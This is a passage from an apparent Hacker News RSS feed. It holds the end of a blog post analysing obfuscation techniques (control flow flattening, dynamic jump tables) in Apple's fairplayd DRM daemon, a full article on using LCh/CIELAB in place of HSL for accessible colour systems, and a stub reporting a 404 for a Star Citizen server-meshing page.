compiling a program that uses both <code>sum</code> functions to see how effective this kind of technique is. The program in fact has two functions <code>sum_1</code>, the obfuscated function, and <code>sum_2</code>, the original function. The <code>sum_2</code> function is decompiled correctly:</p><div><pre tabindex="0"><code data-lang="C"><span><span><span>__int64</span> <span>__fastcall</span> <span>sum_2</span>(<span>int</span> a1, <span>int</span> a2){
</span></span><span><span>  <span>int</span> v3; <span>// [rsp+4h] [rbp-10h]
</span></span></span><span><span><span></span>
</span></span><span><span>  <span>if</span> ( a1 <span>&lt;=</span> <span>500</span> )
</span></span><span><span>    v3 <span>=</span> <span>0</span>;
</span></span><span><span>  <span>else</span>
</span></span><span><span>    v3 <span>=</span> <span>2</span>;
</span></span><span><span>  <span>return</span> (<span>unsigned</span> <span>int</span>)(v3 <span>+</span> a2 <span>+</span> a1 <span>+</span> <span>4</span>);
</span></span><span><span>}
</span></span></code></pre></div><p>The function is very similar to the original. In addition, the control flow graph constructed by IDA is not suspicious and looks the same as the graph constructed by us manually. Different is the case for <code>sum_1</code>:</p><div><pre tabindex="0"><code data-lang="C"><span><span><span>__int64</span> <span>__fastcall</span> <span>sum_1</span>(<span>int</span> a1, <span>int</span> a2){
</span></span><span><span>  <span>int</span> v3; <span>// [rsp+8h] [rbp-14h]
</span></span></span><span><span><span></span>  <span>int</span> v4; <span>// [rsp+Ch] [rbp-10h]
</span></span></span><span><span><span></span>  <span>int</span> i; <span>// [rsp+10h] [rbp-Ch]
</span></span></span><span><span><span></span>
</span></span><span><span>  <span>for</span> ( i <span>=</span> <span>0</span>; ; i <span>=</span> <span>5</span> )
</span></span><span><span>  {
</span></span><span><span>    <span>while</span> ( <span>1</span> )
</span></span><span><span>    {
</span></span><span><span>      <span>while</span> ( <span>1</span> )
</span></span><span><span>      {
</span></span><span><span>        <span>while</span> ( i <span>==</span> <span>-</span><span>1</span> )
</span></span><span><span>        {
</span></span><span><span>          v3 <span>=</span> <span>0</span>;
</span></span><span><span>          i <span>=</span> <span>5</span>;
</span></span><span><span>        }
</span></span><span><span>        <span>if</span> ( i )
</span></span><span><span>          <span>break</span>;
</span></span><span><span>        v4 <span>=</span> <span>4</span>;
</span></span><span><span>        i <span>=</span> <span>2</span>;
</span></span><span><span>      }
</span></span><span><span>      <span>if</span> ( i <span>!=</span> <span>2</span> )
</span></span><span><span>        <span>break</span>;
</span></span><span><span>      <span>if</span> ( a1 <span>&lt;=</span> <span>500</span> )
</span></span><span><span>        i <span>=</span> <span>-</span><span>1</span>;
</span></span><span><span>      <span>else</span>
</span></span><span><span>        i <span>=</span> <span>4</span>;
</span></span><span><span>    }
</span></span><span><span>    <span>if</span> ( i <span>!=</span> <span>4</span> )
</span></span><span><span>      <span>break</span>;
</span></span><span><span>    v3 <span>=</span> <span>2</span>;
</span></span><span><span>  }
</span></span><span><span>  <span>return</span> (<span>unsigned</span> <span>int</span>)(v3 <span>+</span> a2 <span>+</span> a1 <span>+</span> v4);
</span></span><span><span>}
</span></span></code></pre></div><p>Meanwhile, we can say that we have managed to confuse the IDA decompiler. Indeed, we notice that a for is constructed, then 3 <code>while(1)</code> loops one inside the other. Although the result of the decompiler may not be exactly correct and is different from the original code, the program works. An attacker would then be able to pick up the program logic. This is a typical example of weak obfuscation: the attacker may have some difficulty reconstructing the original control flow, but there is a good chance that the initial logic can be recovered. To make it even more complex, we can use the other techniques: insertion of opaque predicates, transformations of constants, transformations of arithmetic Boolean expressions.</p><p>Returning to <code>fairplayd</code>, the control flow flattening technique is used heavily to try to obfuscate the control flow evolution that fairplay has during execution. We open with IDA the function <code>sub_10003FE60</code> and extract the logic of operation via the decompiler view. In particular, we can see that the decompiler can understand the use of a high-level switch-like structure:</p><div><pre tabindex="0"><code data-lang="C"><span><span><span>switch</span> ( (v7 <span>==</span> <span>0</span>) <span>+</span> v2 ){
</span></span><span><span>    <span>case</span> <span>0</span><span>:</span>
</span></span><span><span>      <span>JUMPOUT</span>(<span>0x100035E2CLL</span>);
</span></span><span><span>    <span>case</span> <span>1</span><span>:</span>
</span></span><span><span>      <span>JUMPOUT</span>(<span>0x10004359ELL</span>);
</span></span><span><span>    <span>case</span> <span>2</span><span>:</span>
</span></span><span><span>      <span>JUMPOUT</span>(<span>0x10005BECDLL</span>);
</span></span><span><span>    <span>case</span> <span>3</span><span>:</span>
</span></span><span><span>      v46 <span>=</span> v3;
</span></span><span><span>      v45 <span>=</span> a1;
</span></span><span><span>      v8 <span>=</span> v2 <span>^</span> <span>6u</span>;
</span></span><span><span>      v9 <span>=</span> v8 <span>-</span> <span>5</span>;
</span></span><span><span>      v10 <span>=</span> ((_DWORD)v8 <span>-</span> <span>5</span>) <span>|</span> <span>2u</span>;
</span></span><span><span>      ....
</span></span><span><span>}
</span></span></code></pre></div><p>However, by examining all cases within the switch, we will have nonsense instructions! This is because Apple’s developers have managed to heavily obfuscate the state variable, namely <code>v2</code> and <code>v7</code>. On the other hand, the decompiler recognizes the switch construct only by the presence of <strong>jump tables</strong>, particular tables whose entries consist of memory addresses to jump to. Suppose you have 5 branches of a switch, you can store 5 different addresses in memory, each associated with a different branch of the switch. When comparing, you would simply jump to the address pointed to the correct cell in the table. These tables are stored at specific locations in the binary, and with a little luck it is possible to restore them all.</p><p>To raise the bar of analysis difficulty even higher, the developers decided that for some functions the jump table would be recreated dynamically. Very briefly, the program allocates a memory space where addresses can be entered that will later be used as branches of a switch. The calculation of the addresses is done by the usual MBA expressions, and due to a number of technical limitations of static analysis it is not possible to determine the addresses exactly. This in a nutshell completely destroys any possibility for IDA and the analyst to recover the original program logic and structure.</p><p>Typical example of address construction comes from the last portion of code in each basic block (the fact that address construction occurs inline adds complexity to the code):</p><div><pre tabindex="0"><code data-lang="asm"><span><span><span>lea</span>     <span>r12</span>, <span>jpt_10003FF12</span>								<span>; address where to fetch the next address
</span></span></span><span><span><span></span><span>movsxd</span>  <span>rax</span>, <span>ds</span>:(<span>jpt_10003FF12</span> - <span>100218890</span><span>h</span>)[<span>r12</span><span>+</span><span>rax</span>*<span>4</span>] <span>; move the address referred by jpt_10003FF12 - 100218890h
</span></span></span><span><span><span></span><span>lea</span>     <span>rcx</span>, <span>loc_10005A140</span> 								<span>; load the address of loc_10005A140 (base address of jump table)
</span></span></span><span><span><span></span><span>add</span>     <span>rcx</span>, <span>rax</span>										<span>; add the rax value
</span></span></span><span><span><span></span><span>mov</span>     <span>r14</span>, [<span>rbp</span><span>+</span><span>var_58</span>]								<span>; save previous variable on stack
</span></span></span><span><span><span></span><span>jmp</span>     <span>rcx</span>												<span>; jump to next switch case
</span></span></span></code></pre></div><p>The control flow flattening technique thus turns out to be a good obfuscation technique by which Apple is able to prevent static analysis by attackers. Dynamic table construction, combined with the set of techniques mentioned in the previous subsections (opaque predicates, MBA) are the key to fairplayd obfuscation.</p><h2 id="are-further-obfuscation-measures-possible">Are further obfuscation measures possible?</h2><p>Throughout this article we have tried to identify some common obfuscation patterns that can be found in <code>fairplayd</code>, a userspace daemon used by Apple to protect copyrighted content within macOS. Some measures have proved effective: they actually complicate any attempt to accurately reverse engineer the program. The measure that is most complicit in this complication is given by the control flow flattening which eliminates the chances for an attacker to recover the original structure of the program. Attackers are faced with dynamically constructed jump tables, unrecoverable switches, and dynamically generated code.</p><p>Other obfuscation techniques seem to be good ideas, but only in theory: opaque predicates are simple enough to parse, and through a more thorough check of the building blocks it is possible to distinguish between the original code and the modified code to introduce obfuscation.</p><p>Is there a perfect fit to be able to obfuscate the code? Is it possible to devise a technique capable of producing unassailable protection? No. It will always be an ongoing evolution between tools that try to deobfuscate hidden content and new techniques to be able to bypass these tools and apply heavier obfuscation. This is given by the limitation of digital content management: the information must ultimately be able to be visible and therefore deobfuscate, as opposed to other types of information that can be hidden forever inside the devices. It is likely that after yet another article about obfuscation within <code>fairplayd</code> the protection measures will be updated again, causing the article content to be out of date.</p><p>One possible avenue that Apple could pursue to apply more powerful obfuscation is to move much of the execution to an obfuscation technique called “virtualization”. This technique involves writing an interpreter and a completely ad-hoc instruction set architecture to perform the operations necessary to decrypt the content. At the moment the technique doesn’t seem to be used inside <code>fairplayd</code>, but there are some signs (like switches with a lot of branches) that seem to predict the use of data evaluation and dynamic code production. Honestly, I haven’t had time to analyze this part in detail yet.</p><p>As always, if you have any criticisms, suggestions or any other comments, you can write an email to <a href="mailto:seekbytes@protonmail.com">seekbytes@protonmail.com</a><sup id="fnref:4"><a href="#fn:4" role="doc-noteref">4</a></sup>. I never want to be the voice of the truth, so reports of errors or inaccuracies are always welcome.</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Accessible Palette: stop using HSL for color systems (291 pts)]]></title>
            <link>https://wildbit.com/blog/accessible-palette-stop-using-hsl-for-color-systems</link>
            <guid>37307473</guid>
            <pubDate>Tue, 29 Aug 2023 13:21:34 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://wildbit.com/blog/accessible-palette-stop-using-hsl-for-color-systems">https://wildbit.com/blog/accessible-palette-stop-using-hsl-for-color-systems</a>, See on <a href="https://news.ycombinator.com/item?id=37307473">Hacker News</a></p>
<div id="readability-page-1" class="page"><div itemprop="articleBody">
          

  
    
      <p>Recently, I set out on a mission to reconstruct a color system in <a href="https://postmarkapp.com/" target="_blank">Postmark</a>. This project addressed several problems with our design system, involved a lot of research, and even required building a few custom tools. Now that this project is finished, I want to share the most important lessons I learned about color and present a new design and accessibility tool <a href="https://accessiblepalette.com/" target="_blank">Accessible Palette</a> born out of this work.</p>

    
  
    
      <p>The main problems with our old palette were inconsistent perceived lightness of colors (blues and reds are much darker than yellows and greens) and unpredictable contrast ratios between color variants. When picking a color pair, we couldn’t easily tell if it would meet the recommendations from <a href="https://www.w3.org/TR/WCAG21/#contrast-minimum" target="_blank">Web Content Accessibility Guidelines</a> (WCAG) and had to manually check the contrast ratio. (Or, most likely… not&nbsp;check.)</p>

    
  
    
                              
            
        
                                
          
        
                                    
      

      
              <figure>
          <p><img src="https://storage.googleapis.com/public-assets.wildbit.com/blog-images/2021/09/_normal/pm-color-system-v1.png" srcset="https://storage.googleapis.com/public-assets.wildbit.com/blog-images/2021/09/pm-color-system-v1.png 2x" width="610" height="430" itemprop="image" alt="Postmark Color System v1 with inconsistent lightness" title="Postmark Color System v1 with inconsistent lightness"></p>

                      <figcaption><p>Postmark Color System v1 with inconsistent lightness</p></figcaption>
          
        </figure>
      
    
  
    
                              
            
        
                                
          
        
                                    
      

      
              <figure>
          <p><img src="https://storage.googleapis.com/public-assets.wildbit.com/blog-images/2021/09/_normal/pm-color-system-v1-cr.png" srcset="https://storage.googleapis.com/public-assets.wildbit.com/blog-images/2021/09/pm-color-system-v1-cr.png 2x" width="610" height="370" itemprop="image" alt="Contrast ratios against white background" title="Contrast ratios against white background"></p>

                      <figcaption><p>Contrast ratios against white background</p></figcaption>
          
        </figure>
      
    
  
    
      <p>In fact, both of these problems were caused by <a target="_blank" href="https://en.wikipedia.org/wiki/HSL_and_HSV#Disadvantages" rel="noreferrer nofollow noopener">the inherent fault in the HSL color model</a> and lack of support for better alternatives in the design tools. While HSL and HSV are fine choices for choosing a single color, they’re not suitable for building a color system, as they simply transform the RGB model and ignore the complexities of human perception. To see what’s wrong with them and find an alternative, we need to look at color theory and consider other color spaces.</p>
<h2>Stop using HSL for color systems!</h2>
<p>The <strong>RGB</strong> color model reflects how screens work and is not trying to be user-friendly or intuitive. Instead, in the 1970s, researchers came up with <strong>HSL</strong> (Hue, Saturation, Lightness) and <strong>HSV/HSB</strong> (Hue, Saturation, Value or Brightness) models as alternative representations of RGB, based on how humans think of colors. The intention was good, but they had to trade off perceptual relevance for computation speed, as more sophisticated models would have been too computationally expensive for that time. The resulting HSL and HSV models are easy mathematical transformations of RGB that don’t reflect a human perception of lightness or saturation.</p>
<p>Consider colors in this scale with the same Saturation (100) and Lightness (50) in&nbsp;HSL:</p>

    
  
    
                              
            
        
                                
          
        
                                    
      

      
              <figure>
          <p><img src="https://storage.googleapis.com/public-assets.wildbit.com/blog-images/2021/09/_normal/hsl-gradient-l50-s100.png" srcset="https://storage.googleapis.com/public-assets.wildbit.com/blog-images/2021/09/hsl-gradient-l50-s100.png 2x" width="610" height="140" itemprop="image" alt="HSL gradient with Saturation set to 100 and Lightness to 50" title="HSL gradient with Saturation set to 100 and Lightness to 50"></p>

          
        </figure>
      
    
  
    
      <p>While this scale may have consistent lightness according to the color model, it definitely feels wrong for a human&nbsp;— visually, blue (<code>#00F</code>) is much darker than yellow (<code>#FF0</code>) or cyan (<code>#0FF</code>). This happens because in HSL, fully saturated colors are mapped to the peak RGB values and placed around a Hue circle at a Lightness value of 50, with values of 0 and 100 corresponding to fully black and white, respectively. When a lighter or darker variant of the color is needed, it gets “mixed” with white or black. The central vertical axis comprises the range of <em>neutral</em> or <em>gray</em> colors with a Saturation of zero. (The difference between HSL and HSV is insignificant for this discussion, but instead of “mixing” colors, HSV represents how colors appear under bright light, so the most saturated colors have a Value of&nbsp;100.)</p>

    
  
    
                              
            
        
                                
          
        
                                    
      

      
              <figure>
          <p><img src="https://storage.googleapis.com/public-assets.wildbit.com/blog-images/2021/09/_full/rgb-to-hsl-and-hsv.png" srcset="https://storage.googleapis.com/public-assets.wildbit.com/blog-images/2021/09/rgb-to-hsl-and-hsv.png 2x" width="960" height="450" itemprop="image" alt="RGB cube transformation to HSL and HSV cylinders" title="RGB cube transformation to HSL and HSV cylinders"></p>

                      <figcaption><p>Based on illustrations by Jacob Rus and Michael Horvath (SharkD), CC BY-SA 3.0, Wikimedia Commons.</p></figcaption>
          
        </figure>
      
    
  
    
      <p>Luckily, we’re not limited by computational speed anymore and can use better tools for this&nbsp;job.</p>
<h2>Meet CIELAB and LCh</h2>
<p>By the time HSL and HSV models were formalized, a better alternative already existed. The International Commission on Illumination (abbreviated CIE) defined the <strong>CIELAB or L*a*b*</strong> color space back in 1976. It was designed as a perceptually uniform color space, where a given <em>numerical change</em> corresponds to a similar <em>perceived change</em> in color. Unlike the RGB color model, CIELAB is designed to cover the entire range of visible colors, and its Lightness <em>(L*)</em> component closely matches human perception.</p>
<p>Here is how this color space is defined, <a target="_blank" href="https://en.wikipedia.org/wiki/CIELAB_color_space" rel="noreferrer nofollow noopener">according to Wikipedia</a>:</p>
<blockquote>The lightness value <em>L*</em> defines black at 0 and white at 100. The <em>a*</em> axis is relative to the green-red opponent colors, with negative values toward green and positive values toward red. The <em>b*</em> axis represents the blue-yellow opponents, with negative numbers toward blue and positive toward yellow.</blockquote>
<p>Earlier, I said that RGB isn’t user-friendly or intuitive. Well, CIELAB really put things into perspective.</p>

    
  
    
                              
            
        
                                
                                
        
                                    
      

      
              <figure>
          <p><img src="https://storage.googleapis.com/public-assets.wildbit.com/blog-images/2021/09/_normal/Visible_gamut_within_CIELAB_color_space_D65_whitepoint_mesh.png" srcset="https://storage.googleapis.com/public-assets.wildbit.com/blog-images/2021/09/_normal2x/Visible_gamut_within_CIELAB_color_space_D65_whitepoint_mesh.png 2x" width="610" height="610" itemprop="image" alt="Visible gamut within CIELAB color space" title="Visible gamut within CIELAB color space"></p>

                      <figcaption><p>Visible gamut within CIELAB color space (see also <a href="https://commons.wikimedia.org/wiki/File:Visible_gamut_within_CIELAB_color_space_D65_whitepoint_mesh.webm" target="_blank" rel="noreferrer noopener">as a video</a>). <em>a</em> and <em>b</em> are the horizontal axes; <em>L</em> is the vertical axis. Michael Horvath (SharkD), Christoph Lipka, CC BY-SA 4.0, via Wikimedia Commons.</p></figcaption>
          
        </figure>
      
    
  
    
      <p>Just as HSL and HSV are easier-to-use cylindrical representations of the RGB, <strong>CIELCh or LCh or Lch(ab)</strong> color space is a <a target="_blank" href="https://en.wikipedia.org/wiki/CIELAB_color_space#Cylindrical_model" rel="noreferrer nofollow noopener">cylindrical representation of CIELAB</a>. Chromaticity components <em>a*</em> and <em>b*</em> are replaced with <em>Chroma</em> (relative&nbsp;saturation) and <em>Hue</em> angle, while <em>Lightness</em> remains unchanged. The Hue angle is similar to the one in HSL, but they’re not identical&nbsp;— HSL/HSV uses the three additive primary colors red, green, and blue (H&nbsp;= 0, 120, 240°). Instead, the LCh system uses the four colors red, yellow, green, and blue (h&nbsp;= 0, 90, 180, 270°). (It’s worth mentioning there is a similar <a target="_blank" href="https://en.wikipedia.org/wiki/HCL_color_space" rel="noreferrer nofollow noopener"><strong>HCL or LCh(uv)</strong></a> color space with a Chroma on a uniform scale from 0 to 100, unlike an LCh(ab) where it varies based on Hue and Lightness.)</p>

    
  
    
                              
            
        
                                
                                
        
                                    
      

      
              <figure>
          <p><img src="https://storage.googleapis.com/public-assets.wildbit.com/blog-images/2021/09/_normal/Visible_gamut_within_CIELCHab_color_space_D65_whitepoint_mesh.png" srcset="https://storage.googleapis.com/public-assets.wildbit.com/blog-images/2021/09/_normal2x/Visible_gamut_within_CIELCHab_color_space_D65_whitepoint_mesh.png 2x" width="610" height="610" itemprop="image" alt="Visible gamut within CIELCh color space" title="Visible gamut within CIELCh color space"></p>

                      <figcaption><p>Visible gamut within CIELCh color space (see also <a href="https://commons.wikimedia.org/wiki/File:Visible_gamut_within_CIELCHab_color_space_D65_whitepoint_mesh.webm">as a video</a>). <em>L</em> is the vertical axis; <em>C</em> is the cylinder radius; <em>h</em> is the angle around the circumference. Michael Horvath (SharkD), Christoph Lipka, CC BY-SA 4.0, via Wikimedia Commons.</p></figcaption>
          
        </figure>
      
    
  
    
      <p>You may notice that, unlike HSL and HSV, LCh fits inside a cylinder but doesn’t fill it. This is expected, as some combinations of Lightness, Chroma, and Hue produce impossible colors&nbsp;— for example, a dark saturated yellow just doesn’t exist. The closer the visible gamut gets to black and white on a Lightness scale, the fewer colors can be distinguished by a human eye. In reality, not even all of these visible colors can be displayed on a screen&nbsp;— the sRGB gamut represents a typical screen and includes only about ⅓ of the LCh color space. That’s what we’re limited to in CSS as well, <a target="_blank" href="https://lea.verou.me/2020/04/lch-colors-in-css-what-why-and-how/" rel="noreferrer nofollow noopener">at least for now</a>.</p>

    
  
    
                              
            
        
                                
                                
        
                                    
      

      
              <figure>
          <p><img src="https://storage.googleapis.com/public-assets.wildbit.com/blog-images/2021/09/_normal/SRGB_gamut_within_CIELCHab_color_space_isosurface.png" srcset="https://storage.googleapis.com/public-assets.wildbit.com/blog-images/2021/09/_normal2x/SRGB_gamut_within_CIELCHab_color_space_isosurface.png 2x" width="610" height="610" itemprop="image" alt="The sRGB gamut plotted within the cylindrical LCh color space" title="The sRGB gamut plotted within the cylindrical LCh color space"></p>

                      <figcaption><p>The sRGB gamut plotted within the cylindrical LCh color space (see also <a href="https://commons.wikimedia.org/wiki/File:SRGB_gamut_within_CIELCHab_color_space_mesh.webm" target="_blank" rel="noreferrer noopener">as a video</a>). Michael Horvath (SharkD), Christoph Lipka, CC BY-SA 4.0, via Wikimedia Commons.</p></figcaption>
          
        </figure>
      
    
  
    
      <p>Let’s go back to our HSL color scale with Saturation of 100 and Lightness of 50 and see what its Lightness is in LCh:</p>

    
  
    
                              
            
        
                                
          
        
                                    
      

      
              <figure>
          <p><img src="https://storage.googleapis.com/public-assets.wildbit.com/blog-images/2021/09/_normal/hsl-gradient-with-lch-lightness.png" srcset="https://storage.googleapis.com/public-assets.wildbit.com/blog-images/2021/09/hsl-gradient-with-lch-lightness.png 2x" width="610" height="199" itemprop="image" alt="HSL gradient with LCh Lightness levels" title="HSL gradient with LCh Lightness levels"></p>

          
        </figure>
      
    
  
    
      <p>Now, these numbers make more sense&nbsp;— yellow is the lightest color, blue is the darkest, greens are almost three times lighter than blue or twice than reds. Let’s rebuild this scale in LCh with a consistent level of Lightness:</p>

    
  
    
                              
            
        
                                
          
        
                                    
      

      
              <figure>
          <p><img src="https://storage.googleapis.com/public-assets.wildbit.com/blog-images/2021/09/_normal/lch-controlled-lightness.png" srcset="https://storage.googleapis.com/public-assets.wildbit.com/blog-images/2021/09/lch-controlled-lightness.png 2x" width="610" height="335" itemprop="image" alt="LCh scale with a consistent level of Lightness" title="LCh scale with a consistent level of Lightness"></p>

          
        </figure>
      
    
  
    
      <p>Because of the varied Chroma component, some of these colors are more saturated than others, but their lightness is visually consistent. This doesn’t look good as a gradient but may be desirable in a color system&nbsp;— I want my colors for notifications and warnings more saturated than shades of the base text. Just for curiosity sake, let’s see how these scales look with more consistency in Chroma:</p>

    
  
    
                              
            
        
                                
          
        
                                    
      

      
              <figure>
          <p><img src="https://storage.googleapis.com/public-assets.wildbit.com/blog-images/2021/09/_normal/lch-controlled-lightness-and-chroma.png" srcset="https://storage.googleapis.com/public-assets.wildbit.com/blog-images/2021/09/lch-controlled-lightness-and-chroma.png 2x" width="610" height="335" itemprop="image" alt="LCh scale with consistent levels of Lightness and Chroma" title="LCh scale with consistent levels of Lightness and Chroma"></p>

          
        </figure>
      
    
  
    
      <p>Smooth as butter, even while we’re dealing with a limited sRGB color space. This is a great foundation for building a color system.</p>
<p>At this point, you may wonder why the design community does not widely use this powerful color space. As of today, neither Figma, Sketch, or Adobe XD support CIELAB or LCh. There is an <a target="_blank" href="https://www.figma.com/community/plugin/969496279507778512/LCH" rel="noreferrer nofollow noopener">LCH color picker</a> and <a target="_blank" href="https://www.figma.com/community/plugin/759433498184507623/Chromatic-Figma" rel="noreferrer nofollow noopener">Chromatic</a> plugins for Figma, but I didn’t find them sufficient to construct a flexible color system. <strong>The ideal tool for the job would generate color variants with persistent lightness, let me control the contrast ratio between them, and be flexible enough to accommodate existing brand colors.</strong> That’s when I discovered a <a target="_blank" href="https://gka.github.io/chroma.js/" rel="noreferrer nofollow noopener">Chroma.js library</a> with great LCh support and decided to write a simple tool to generate a new palette from code. After using this tool internally and sharing it with a few friends, we decided to turn it into an app and share it publicly as a project from our <a target="_blank" href="https://postmarkapp.com/labs" rel="noreferrer nofollow noopener">Labs</a>.</p>
<h2>Introducing Accessible Palette</h2>
<p><mark><strong><a href="https://accessiblepalette.com/" target="_blank">Accessible Palette</a> is an app for building color systems with consistent lightness and predictable contrast ratios across color levels.</strong></mark> It’s flexible enough to accommodate existing brand colors and lighter or darker palettes. Let’s see how it works:</p>

    
  
    
                              
            
        
                                
          
        
                                    
      

      
              <figure>
          <p><img src="https://storage.googleapis.com/public-assets.wildbit.com/blog-images/2021/09/_full/accessiblepalette@2x.png" srcset="https://storage.googleapis.com/public-assets.wildbit.com/blog-images/2021/09/accessiblepalette@2x.png 2x" width="960" height="1076" itemprop="image" alt="The interface of the Accessible Palette app" title="The interface of the Accessible Palette app"></p>

                      <figcaption><p>The interface of the <a href="https://accessiblepalette.com/" target="_blank" rel="noreferrer noopener">Accessible Palette</a> app</p></figcaption>
          
        </figure>
      
    
  
    
      <ul><li>You begin by tweaking one of the <strong>starting colors</strong> or pasting the existing color from your design. The tool will use color’s Chroma and Hue to calculate a scale with multiple lightness levels.</li><li><strong>Lightness</strong> is completely customizable and can work both with light and dark palettes. It also provides granular control over a palette to include existing brand colors. In our case, I wanted to preserve the three most used colors from the original Postmark palette&nbsp;— yellow <code>#FFDE00</code>, blue <code>#007DCC</code>, and green <code>#4FC47F</code>. After taking them as starting colors, I used their Lightness values (88.6, 75.2, and 50.6, respectively) as lightness for levels 200, 400, and 600.</li><li><strong>Contrast ratio</strong> depends on Lightness and is calculated for every level using both current WCAG 2.1 Recommendations and a new algorithm in an upcoming 3.0 Working Draft. (The current way of measuring contrast is flawed, but we’ll talk about this later.) By default, the contrast of every color is measured against a white background, but you can select any color swatch to measure the contrast ratio against it.</li><li>Levels can be generated using <strong>RGB or CIELAB</strong> color space. In some cases, the results can be different, so it’s worth experimenting. In the Postmark color scheme, using CIELAB reduced purplish tint in lighter reds (good) but increased in blues (bad).</li></ul>

    
  
    
                              
            
        
                                
          
        
                                    
      

      
              <figure>
          <p><img src="https://storage.googleapis.com/public-assets.wildbit.com/blog-images/2021/09/_normal/cielab-vs-rgb-scale.png" srcset="https://storage.googleapis.com/public-assets.wildbit.com/blog-images/2021/09/cielab-vs-rgb-scale.png 2x" width="610" height="440" itemprop="image" alt="Red and blue scales generated in CIELAB and RGB color spaces" title="Red and blue scales generated in CIELAB and RGB color spaces"></p>

          
        </figure>
      
    
  
    
      <ul><li>For some colors, you may want to <strong>shift Hue across the range</strong>. Our bright yellow is a good example&nbsp;— as it gets darker, colors get a greenish shade. To shift them a little closer to orange, I use a negative Hue compensation.</li></ul>

    
  
    
                              
            
        
                                
          
        
                                    
      

      
              <figure>
          <p><img src="https://storage.googleapis.com/public-assets.wildbit.com/blog-images/2021/09/_normal/hue-shift.png" srcset="https://storage.googleapis.com/public-assets.wildbit.com/blog-images/2021/09/hue-shift.png 2x" width="610" height="250" itemprop="image" alt="Shifting Hue across the range of colors" title="Shifting Hue across the range of colors"></p>

          
        </figure>
      
    
  
    
      <ul><li>As you use the app, it <strong>updates the URL to save changes</strong>. Share it with your team, or add it to your Figma library and a CSS file with color variables for future reference.</li></ul>
<p>The app can be used to generate all kinds of color palettes. Use them as a final color system or as a foundation to build upon. To see some real-world examples, check out a new <a target="_blank" href="https://accessiblepalette.com/?lightness=98,93.3,88.6,79.9,71.2,60.5,49.8,38.4,27,15.6&amp;e94c49=1,0&amp;F1903C=1,-10&amp;f3e203=1,-15&amp;89BF1D=0,0&amp;64c273=0,15&amp;007DCC=0,0&amp;808080=0,0&amp;EAE8DE=0,0&amp;768092=0,0" rel="noreferrer nofollow noopener">Postmark color palette</a> or palettes based on <a target="_blank" href="https://accessiblepalette.com/?lightness=98.2,96.5,94,89.5,77,65,49.5,41,28,20&amp;D81B60=0,0&amp;E53935=0,0&amp;F4511E=0,0&amp;FB8C00=0,0&amp;FFB300=0,0&amp;FDD835=0,0&amp;C0CA33=0,0&amp;7CB342=0,0&amp;43A047=0,0&amp;00897B=0,0&amp;00ACC1=0,0&amp;039BE5=0,0&amp;1E88E5=0,0&amp;3949AB=0,0&amp;5E35B1=0,0&amp;8E24AA=0,0&amp;FAFAFA=0,0" rel="noreferrer nofollow noopener">Google’s Material Design</a> or <a target="_blank" href="https://accessiblepalette.com/?lightness=98,96,91.5,85,67,48,36,27,16,8&amp;DB2777=0,0&amp;DC2626=0,0&amp;D97706=0,-10&amp;059669=0,0&amp;007afd=0,0&amp;4F46E5=0,0&amp;7C3AED=1,0&amp;47556a=0,0" rel="noreferrer nofollow noopener">TailwindCSS</a>. They’re not exact replicas, but alternative takes inspired by the original colors and levels of lightness.</p>
<h2>Bonus: How are contrast ratios calculated?</h2>
<p>So why does Accessible Palette show <em>two</em> different contrast ratios? WCAG 2.1 calculates the contrast ratio by dividing the luminance of the foreground color by the luminance of the background. The problem is this formula provides a linear response, while humans perceive the contrast between lighter colors as higher than between darker colors. Consider these examples:</p>

    
  
    
                              
            
        
                                
          
        
                                    
      

      
              <figure>
          <p><img src="https://storage.googleapis.com/public-assets.wildbit.com/blog-images/2021/09/_normal/wcag-2-cr-issues.png" srcset="https://storage.googleapis.com/public-assets.wildbit.com/blog-images/2021/09/wcag-2-cr-issues.png 2x" width="610" height="411" itemprop="image" alt="Problems with contrast ratio algorithm in WCAG 2.1" title="Problems with contrast ratio algorithm in WCAG 2.1"></p>

          
        </figure>
      
    
  
    
      <p>In practice, samples meeting the WCAG 2.1 recommendations are harder to read than those with an “insufficient” contrast ratio. Luckily, W3C is aware of this problem, as <a target="_blank" href="https://github.com/w3c/wcag/issues/695" rel="noreferrer nofollow noopener">Andrew Somers started an open discussion</a> back in 2019. (It’s a fascinating and deep reading if you have a spare evening or two.) He proposed a better working algorithm that is now a part of the <a target="_blank" href="https://www.w3.org/TR/wcag-3.0/#visual-contrast-of-text" rel="noreferrer nofollow noopener">WCAG 3 Working Draft</a> and built an <a target="_blank" href="https://www.myndex.com/APCA/" rel="noreferrer nofollow noopener">APCA Contrast Calculator</a> that is perceptually accurate and also takes font size and weight into account. Accessible Palette uses his Advanced Perceptual Contrast Algorithm (APCA) and considers score 60 as the minimum level recommended for readable text, similar to the old 4.5:1 contrast ratio recommendation in WCAG 2.1.</p>
<p>Let’s see how our examples will hold up with the new algorithm:</p>

    
  
    
                              
            
        
                                
          
        
                                    
      

      
              <figure>
          <p><img src="https://storage.googleapis.com/public-assets.wildbit.com/blog-images/2021/09/_normal/wcag-3-cr.png" srcset="https://storage.googleapis.com/public-assets.wildbit.com/blog-images/2021/09/wcag-3-cr.png 2x" width="610" height="461" itemprop="image" alt="Improved contrast ratio algorithm in WCAG 3 Working Draft" title="Improved contrast ratio algorithm in WCAG 3 Working Draft"></p>

          
        </figure>
      
    
  
    
      <p>Does it mean that WCAG 2.1 contrast ratio is useless? No, it’s still fairly accurate for mid-range colors, but overall the new algorithm is a massive improvement. Keep in mind that it’s still a Working Draft and may change over time. For maximum future-proofness and compliance with current guidelines, try building your color system with both guidelines in mind.<br></p>
<p>As I started working on Postmark’s new color system, I didn’t expect to give up on the most commonly used color model or question WCAG’s current guidelines. This project led me down the rabbit hole of color theory and resulted in a tool that can help build consistent and accessible color palettes with very little effort. This is a rare situation when both designers and users win in the end. If you end up using Accessible Palette for your project or have questions about it, please <a href="mailto:hello@efedorenko.com">send me an email</a>&nbsp;or <a href="https://twitter.com/efedorenko" target="_blank">reach out on Twitter</a>!</p>

    
  
        </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[StarCitizen Server Meshing Architecture (101 pts)]]></title>
            <link>https://sc-server-meshing.info/wiki</link>
            <guid>37307253</guid>
            <pubDate>Tue, 29 Aug 2023 13:06:43 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://sc-server-meshing.info/wiki">https://sc-server-meshing.info/wiki</a>, See on <a href="https://news.ycombinator.com/item?id=37307253">Hacker News</a></p>
Couldn't get https://sc-server-meshing.info/wiki: Error: Request failed with status code 404]]></description>
        </item>
        <item>
